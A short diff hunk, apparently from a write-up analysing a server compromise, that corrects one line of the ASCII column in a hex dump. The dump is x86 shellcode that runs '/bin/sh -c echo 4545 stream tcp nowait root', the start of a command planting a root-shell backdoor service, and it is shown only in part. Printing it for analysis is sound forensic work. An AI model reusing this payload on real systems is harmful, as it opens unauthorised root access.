@@ -134,7 +134,7 @@ To get you started, here are the basic facts about the compromise:
    20 89 5E B0 83 EE 20 8D 5E 2E 83 C6 20 83 C3 20   .^... .^...  ..
    83 EB 23 89 5E B4 31 C0 83 EE 20 88 46 27 88 46  ..#.^.1... .F'.F
    2A 83 C6 20 88 46 AB 89 46 B8 B0 2B 2C 20 89 F3  *.. .F..F..+, ..
-   8D 4E AC 8D 56 B8 CD 80 31 DB 89 D8 40 CD 80 E8  [email protected]
+   8D 4E AC 8D 56 B8 CD 80 31 DB 89 D8 40 CD 80 E8  .N..V...1...@...
    B0 FF FF FF 2F 62 69 6E 2F 73 68 20 2D 63 20 65  ..../bin/sh -c e
    63 68 6F 20 34 35 34 35 20 73 74 72 65 61 6D 20  cho 4545 stream
    74 63 70 20 6E 6F 77 61 69 74 20 72 6F 6F 74 20  tcp nowait root
